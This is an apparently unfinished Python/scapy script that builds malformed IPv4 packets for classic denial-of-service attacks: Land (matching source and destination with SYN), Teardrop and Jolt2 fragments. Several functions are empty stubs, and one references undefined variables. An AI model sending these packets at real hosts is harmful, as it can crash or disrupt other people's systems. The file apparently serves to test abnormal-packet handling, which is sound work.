# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> ipv4_exception_packets.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/28 14:34

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

from scapy.all import *
import random


def ipv4_ping_of_death():
    pass


# 构造ipv4 Land-Base攻击异常包，需源目的地址相同，且TCP配置SYN标识位。
def ipv4_land_base(smac, target):
    data_link_layer = Ether(
        src = smac
    )
    network_layer = IP(
        src = target,
        dst = target
    )
    transport_layer = TCP(
        sport = random.randint(1000, 65535),
        dport = random.randint(1000, 65535),
        flags = "S"
    )
    pkt = network_layer / transport_layer
    return pkt


def ipv4_tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
    network_layer = IP(
        id = 28752,
        flags = flags,
        frag = frag,
        ttl = 128,
        proto = proto,
        dst = dst
    )
    data = data
    pkt = network_layer / data
    return pkt


def ipv4_tcp_flag():
    network_layer = IP(
        src = src,
        dst = dst
    )
    transport_layer = TCP(
        flag = flag
    )
    pkt = network_layer / transport_layer
    return pkt


def ipv4_winnuke():
    pass


def ipv4_smurf():
    pass


def ipv4_ip_option():
    pass


def ipv4_ip_spoof():
    pass


def ipv4_jolt2(flags, frag = 0, ttl = 128, proto = 17, dst = "192.168.15.70", data = ""):
    network_layer = IP(
        id = 28752,
        flags = flags,
        frag = frag,
        ttl = ttl,
        proto = proto,
        dst = dst
    )
    data = data
    pkt = network_layer / data
    return pkt


def ipv4_tcp_sack():
    pass